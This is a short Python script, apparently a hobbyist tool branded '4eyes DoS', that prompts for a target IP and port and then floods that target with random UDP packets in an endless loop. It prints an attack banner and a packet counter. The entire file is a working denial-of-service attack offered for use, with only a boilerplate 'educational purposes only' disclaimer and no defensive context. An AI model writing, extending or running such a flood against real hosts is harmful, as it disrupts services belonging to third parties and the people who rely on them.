print("\033[92m")
import os
import time
import socket

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
test_data = os.urandom(16)

os.system("clear")
print(r""" _  _   _____                      ____      _           
| || | | ____|   _  ___  ___      |  _ \  __| | ___  ___ 
| || |_|  _|| | | |/ _ \/ __|_____| | | |/ _` |/ _ \/ __|
|__   _| |__| |_| |  __/\__ \_____| |_| | (_| | (_) \__ \
   |_| |_____\__, |\___||___/     |____/ \__,_|\___/|___/
             |___/                                       
""")
print("Coded By : 4eyes")
print("Author   : 4eyes")
print("Github   : github.com/4eyes")
print("Note: This tool is illegal to misuse and is for educational purposes only. Use it at your own risk. We aren't responsible for your actions.")
print()

ip = input("IP Target : ")
port = int(input("Port: "))

os.system("clear")
print(r""" _  _   _____                      ____      _           
| || | | ____|   _  ___  ___      |  _ \  __| | ___  ___ 
| || |_|  _|| | | |/ _ \/ __|_____| | | |/ _` |/ _ \/ __|
|__   _| |__| |_| |  __/\__ \_____| |_| | (_| | (_) \__ \
   |_| |_____\__, |\___||___/     |____/ \__,_|\___/|___/
             |___/                                       
""")
print("Team : 4eyes")
print("\033[92m")
print("__________________________4_Eyes_______________________________")
print(f"DoS ATTACK STARTED ON {ip}:{port}")
time.sleep(1)

sent = 0
try:
    while True:
        sock.sendto(test_data, (ip, port))
        sent = sent + 1
        print(f"Sent {sent} packet to {ip} through port: {port}")
except KeyboardInterrupt:
    print("\nAttack stopped by user.")
